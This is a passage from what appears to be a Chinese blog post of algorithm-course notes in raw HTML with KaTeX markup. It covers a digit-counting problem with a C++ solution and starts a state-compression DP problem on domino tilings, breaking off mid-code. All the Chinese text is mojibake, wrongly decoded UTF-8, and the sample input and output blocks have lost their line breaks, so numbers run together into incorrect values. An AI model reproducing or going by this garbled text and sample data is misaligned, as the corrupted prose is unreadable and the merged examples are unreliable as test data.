ä¹‹é—´å…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span> ä¸ªæ•°å¦‚ä¸‹ï¼š</p><p><code>1024 1025 1026 1027 1028 1029 1030 1031 1032</code></p><p>å…¶ä¸­ <code>0</code> å‡ºç° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> æ¬¡ï¼Œ<code>1</code> å‡ºç° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> æ¬¡ï¼Œ<code>2</code> å‡ºç° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æ¬¡ï¼Œ<code>3</code> å‡ºç° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> æ¬¡ç­‰ç­‰â€¦</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚</p><p>æ¯ç»„æµ‹è¯•æ•°æ®å ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>ã€‚</p><p>å½“è¯»å…¥ä¸€è¡Œä¸º <code>0 0</code> æ—¶ï¼Œè¡¨ç¤ºè¾“å…¥ç»ˆæ­¢ï¼Œä¸”è¯¥è¡Œä¸ä½œå¤„ç†ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>æ¯ç»„æ•°æ®è¾“å‡ºä¸€ä¸ªç»“æœï¼Œæ¯ä¸ªç»“æœå ä¸€è¡Œã€‚</p><p>æ¯ä¸ªç»“æœåŒ…å«åä¸ªç”¨ç©ºæ ¼éš”å¼€çš„æ•°å­—ï¼Œç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤º <code>0</code> å‡ºç°çš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤º <code>1</code> å‡ºç°çš„æ¬¡æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>&lt;</mo><mn>100000000</mn></mrow><annotation encoding="application/x-tex">0 &lt; a,b &lt; 100000000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1 1044 497346 5421199 17481496 14031004 5031714 1901317 8541976 4941001 19600 0</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>1 2 1 1 1 1 1 1 1 185 185 185 185 190 96 96 96 95 9340 40 40 93 136 82 40 40 40 40115 666 215 215 214 205 205 154 105 10616 113 19 20 114 20 20 19 19 16107 105 100 101 101 197 200 200 200 200413 1133 503 503 503 502 502 417 402 412196 512 186 104 87 93 97 97 142 196398 1375 398 398 405 499 499 495 488 471294 1256 296 296 296 296 287 286 286 247</code></pre><h3 id="è®¡æ•°é—®é¢˜ç¡¬ä¸Šæ³•">è®¡æ•°é—®é¢˜ç¡¬ä¸Šæ³•</h3><blockquote><p>æ­¤é¢˜ä¸ç»™å‡ºæ•°ä½DPè§£æ³•ï¼šæ„Ÿè§‰ä¸å¦‚ç¡¬ä¸Šç›´æ¥ã€ç®€å•<br>æ•°ä½DPè§£æ³•å¯å‚è€ƒï¼š<a href="https://www.acwing.com/solution/content/4934/">ç”¨æé«˜è¯¾çš„æ–¹å¼æ‰“å¼€åŸºç¡€è¯¾acwing338è®¡æ•°é—®é¢˜</a></p></blockquote><p><strong>æŠ€å·§1</strong> [L, R] -&gt; f(L, i) - f(R - 1ï¼Œ i), f(n, i)ä¸ºæ±‚1ï½næ•°å­—iä¸ªæ•°çš„å‡½æ•°</p><p><strong>æŠ€å·§2</strong> f(n, i) -&gt; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mo>âˆ‘</mo><mi>x</mi><mi>x</mi><mi>x</mi><mo>&lt;</mo><mi>d</mi><mi>j</mi><mo>&gt;</mo><mi>y</mi><mi>y</mi><mi>y</mi><mo separator="true">,</mo><mtext>Â </mtext><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\sum xxx&lt;dj&gt;yyy,\ i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">xxx</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">yyy</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span>, å³é—®é¢˜è½¬åŒ–ä¸ºæ±‚æ•°å­—1ï½nçš„ç¬¬jä½ä¸Šçš„æ•°å­—iä¸ªæ•°<br>&lt;leftPart&gt;&lt;dj&gt;&lt;rightPart&gt;æ˜¯nçš„åè¿›åˆ¶å±•å¼€ï¼Œxxxå’Œyyyéƒ½ä¸ç‰¹æŒ‡3ä½æ•°ï¼Œå…¶ä½æ•°åº”å½“åˆ†åˆ«ä¸&lt;leftPart&gt;å’Œ&lt;rightPart&gt;å¯¹åº”ï¼Œdjæ˜¯å±•å¼€æ•°ä¸­ç¬¬jä½çš„æ•°å­—</p><p><strong>æŠ€å·§3</strong> æŒ‰xxxå¤§åˆ†ç±»è®¨è®ºï¼šæ±‚xxx&lt;dy&gt;yyyå½¢å¼çš„æ•°ä¸­ï¼Œæ•°å­—iåœ¨ç¬¬jä½çš„å‡ºç°æ¬¡æ•°</p><ol><li><p>xxx &lt; &lt;leftPart&gt;</p><ol><li><p>è‹¥iä¸ä¸º0ï¼Œxxxå¯å–000 ~ &lt;leftPart&gt; - 1ï¼Œæœ‰<code>&lt;leftPart&gt; * p</code>ç§ï¼Œp = pow(10, j)</p></li><li><p>è‹¥iç­‰äº0ï¼Œxxxå¯å–001 ~ &lt;leftPart&gt; - 1ï¼Œæœ‰<code>(&lt;leftPart&gt; - 1) * p</code>ç§</p><blockquote><p>å½“i = 0æ—¶ï¼Œå½“&lt;dj&gt; = 0æ—¶ï¼Œxxxä¸èƒ½ä¸º0ï¼ˆä¸èƒ½æœ‰å‰å¯¼0ï¼Œå¦åˆ™11ä¹Ÿèƒ½æŒ‰0011ç®—ï¼Œç»™0åŠ æ•°é‡ï¼‰</p></blockquote></li></ol></li><li><p>xxx = &lt;leftPart&gt;</p><ol><li>i &lt; djæ—¶ yyy : 000 ~ 9â€¦9 å³<code>p</code>ç§é€‰æ³•</li><li>i = djæ—¶ yyy : 000 ~ &lt;rightPart&gt; å³<code>&lt;rightPart&gt; + 1</code> ç§</li><li>i &gt; djæ—¶ 0ç§é€‰æ³•</li></ol></li><li><p>xxx &gt; &lt;leftPart&gt; è¶…å‡ºèŒƒå›´</p></li></ol><blockquote><p>ä¸‹é¢åšæ³•å¾ˆé‡è¦çš„ä¸€ä¸ªé—®é¢˜æ˜¯<code>else res += (left - 1) * p; </code>ä¼šåœ¨<code>i = 0, left = 0</code>æ—¶ä¹Ÿä¼šæ‰§è¡Œ<br>ä½†æ˜¯ç”±äº<code>if (dj &gt; i) res += p</code>ä¹Ÿæœªåˆ¤æ–­<code>i </code>å’Œ<code>left</code>æ˜¯å¦åŒæ—¶ä¸º0ï¼ˆä¸èƒ½åŒæ—¶ä¸º0ï¼ŒåŒæ—¶ä¸º0æ˜¯ä¸åˆæ³•çš„ï¼‰<br>å› æ­¤ï¼Œè¿™æ ·æŠµæ¶ˆä¹‹åæ°å¥½è®¡ç®—æ­£ç¡®</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getDigit</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    res++;</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ä¸è¦æŠŠæ±‚nçš„ä½æ•°, æ±‚ç¬¬jä½æ•°å­—éƒ½æ”¾åœ¨ä¸€ä¸ªå‡½æ•°ä¸­: æ±‚nä½æ•°æ—¶ä¼šå°†nå½’é›¶</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, dgt = <span class="built_in">getDigit</span>(n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = dgt - <span class="number">1</span>; ~j; j--) &#123;  <span class="comment">// ~jè¡¨ç¤º</span></span><br><span class="line">    <span class="type">int</span> p = <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line">    <span class="type">int</span> left = n / p / <span class="number">10</span>, right = n % p, dj = n / p % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (i) res += left * p;</span><br><span class="line">    <span class="keyword">else</span> res += (left - <span class="number">1</span>) * p;  </span><br><span class="line">    <span class="keyword">if</span> (dj &gt; i) res += p;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dj == i) res += right + <span class="number">1</span>;  <span class="comment">// å·¦è¾¹å–xxx, dj=iæ—¶,å³è¾¹å¯å–000~right</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r), l || r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt; r) <span class="built_in">swap</span>(l, r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">count</span>(r, i) - <span class="built_in">count</span>(l - <span class="number">1</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="çŠ¶æ€å‹ç¼©DP">çŠ¶æ€å‹ç¼©DP</h1><blockquote><p>çŠ¶æ€å‹ç¼©:ç”¨ï¼ˆäºŒè¿›åˆ¶ï¼‰æ•´æ•°è¡¨ç¤ºä¸€ä¸ªçŠ¶æ€ã€‚</p></blockquote><h2 id="AcWing-291-è’™å¾·é‡Œå®‰çš„æ¢¦æƒ³"><a href="https://www.acwing.com/activity/content/code/content/64200/">AcWing 291. è’™å¾·é‡Œå®‰çš„æ¢¦æƒ³</a></h2><p><code>éš¾åº¦ï¼šä¸­ç­‰</code></p><p>æ±‚æŠŠ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>Ã—</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N \times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> çš„æ£‹ç›˜åˆ†å‰²æˆè‹¥å¹²ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>Ã—</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">1 \times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> çš„é•¿æ–¹å½¢ï¼Œæœ‰å¤šå°‘ç§æ–¹æ¡ˆã€‚</p><p>ä¾‹å¦‚å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mtext>ï¼Œ</mtext><mi>M</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">N=2ï¼ŒM=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> æ—¶ï¼Œå…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> ç§æ–¹æ¡ˆã€‚å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mtext>ï¼Œ</mtext><mi>M</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">N=2ï¼ŒM=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> æ—¶ï¼Œå…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> ç§æ–¹æ¡ˆã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20221125190249113.png" alt="image-20221125190249113"></p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ã€‚</p><p>å½“è¾“å…¥ç”¨ä¾‹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>0</mn><mtext>ï¼Œ</mtext><mi>M</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">N=0ï¼ŒM=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ—¶ï¼Œè¡¨ç¤ºè¾“å…¥ç»ˆæ­¢ï¼Œä¸”è¯¥ç”¨ä¾‹æ— éœ€å¤„ç†ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹è¾“å‡ºä¸€ä¸ªç»“æœï¼Œæ¯ä¸ªç»“æœå ä¸€è¡Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo separator="true">,</mo><mi>M</mi><mo>â‰¤</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">1 \le N,M \le 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1 21 31 42 22 32 42 114 110 0</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>10123514451205</code></pre><h3 id="çŠ¶æ€å‹ç¼©dp-é¢„å¤„ç†">çŠ¶æ€å‹ç¼©dp + é¢„å¤„ç†</h3><p>æ€è€ƒï¼š</p><ol><li>å…ˆæ”¾æ¨ªæ”¾æ–¹å—ï¼Œè€Œåçºµæ”¾å°æ–¹å—çš„æ–¹æ¡ˆå”¯ä¸€ç¡®å®š<br>å³ï¼šæ€»æ–¹æ¡ˆæ•° = åªæ”¾æ¨ªå‘å°æ–¹å—çš„æ•°é‡</li><li>åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Ÿ<br>æŒ‰åˆ—çœ‹ï¼Œ1ã€è¿ç»­ä¸¤åˆ—åŒè¡Œå°æ–¹å—ä¸å†²çªï¼›2ã€æ¯åˆ—å†…éƒ¨æ‰€æœ‰è¿ç»­ç©ºç€çš„å°æ–¹å—éœ€è¦æ˜¯å¶æ•°ä¸ªã€‚</li></ol><p>DPï¼š</p><ul><li><p>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code></p><ul><li>é›†åˆ å·²å°†å‰<code>i - 1</code>åˆ—æ‘†å¥½ï¼Œä¸”ä»<code>i - 1</code>åˆ—ä¼¸åˆ°ç¬¬<code>i</code>åˆ—çš„çŠ¶æ€æ˜¯<code>j</code>çš„æ–¹æ¡ˆ<br>jä¸ºä¸€ä¸ªäºŒè¿›åˆ¶æ•°ï¼ŒèŒƒå›´æ˜¯0ï½nçš„äºŒè¿›åˆ¶èŒƒå›´ï¼›</li><li>å±æ€§ Num</li></ul></li><li><p>çŠ¶æ€è®¡ç®—</p><ul><li><p>æŒ‰ç…§<code>i - 1</code>åˆ—çš„çŠ¶æ€<code>k</code>è¿›è¡Œåˆ†ç±»</p></li><li><p><code>f[i - 1][k]</code>éœ€è¦æ»¡è¶³</p><ol><li>(j &amp; k) == 0 (åŒä¸€è¡Œè¿ç»­ä¸¤åˆ—ä¸èƒ½éƒ½æ”¾å°æ–¹å—)</li><li>æ‰€æœ‰è¿ç»­ç©ºç€ä½ç½®çš„é•¿åº¦å¿…é¡»ä¸ºå¶æ•° <code>st[j | k]</code></li></ol><blockquote><p>è€ƒè™‘çŠ¶æ€jå¯èƒ½ç”±å“ªäº›çŠ¶æ€kè½¬ç§»è¿‡æ¥ï¼Œè¿™ä¸ªkæ˜¯ç¬¬i-1å±‚çš„é—®é¢˜</p><p>ç¬¬i-1åˆ—æ˜¯å¦æ»¡è¶³ç¬¬2ç‚¹è¦çœ‹ä¸¤ä¸ªçŠ¶æ€ï¼šjå’Œk<br>jæ˜¯åœ¨i-1å±‚æ”¾ç½®çš„å°æ–¹å—ä¼¸å‡ºæ¥å¯¼è‡´çš„ï¼Œkæ˜¯i-2åˆ—å°æ–¹å—ä¼¸å‡ºçš„</p></blockquote></li></ul></li></ul><p>è¡¥å……ï¼š</p><ul><li>åˆ—ä¸‹æ ‡ä»0å¼€å§‹ï¼Œæœ€ç»ˆçŠ¶æ€<code>f[m][0]</code></li><li>é¢„å¤„ç†è®¡ç®—stå’Œstatesæ—¶ä¸èƒ½æ”¾åœ¨whileå¾ªç¯å¤–<br>å› ä¸ºstæ˜¯æ ¹æ®nçš„å˜åŒ–è€Œå˜åŒ–çš„ï¼Œä»¥st[0]ä¸ºä¾‹ï¼Œst[0]è¡¨ç¤ºçš„æ˜¯çŠ¶æ€ä¸º0æ—¶ï¼Œæ˜¯å¦æœ‰è¿ç»­å¥‡æ•°ä¸ªç©ºæ ¼å­ï¼Œå¦‚æœn=1é‚£ä¹ˆæ£‹ç›˜æ€»å…±åªæœ‰1è¡Œï¼ŒçŠ¶æ€ä¸º0æ—¶åªæœ‰1ä¸ªè¿ç»­ç©ºæ ¼ï¼Œæ­¤æ—¶st[0]=false;å¦‚æœn=2ï¼Œåˆ™æ£‹ç›˜ä¸Šæœ‰ä¸¤è¡Œï¼ŒçŠ¶æ€ä¸º00ï¼Œæœ‰ä¸¤ä¸ªç©ºæ ¼å­ï¼Œæ‰€ä»¥st[0]=true</li></ul><ul><li>åˆå§‹åŒ–ï¼š<code>f[0][0] = 1;</code><br>ç¬¬0åˆ—å…¶å®æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½ å¯ä»¥è®¤ä¸ºå®ƒæ˜¯ä¸ºäº†åé¢DPå…¬å¼èƒ½æ­£ç¡®é€’æ¨è€Œåˆ›é€ å‡ºæ¥çš„ï¼ŒåŒæ—¶å®ƒçš„æ‘†æ³•ä¹Ÿä¸èƒ½æ’å…¥åˆ°ç¬¬1åˆ—å½±å“åç»­çš„æ‘†æ³•ï¼Œæ‰€ä»¥å®ƒçš„æ‘†æ³•åªèƒ½æ˜¯ç«–æ”¾1ç§ã€‚ä»é€’æ¨çš„ç»“æœçœ‹ï¼Œè¿™æ ·åˆå§‹åŒ–ä¸º1ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 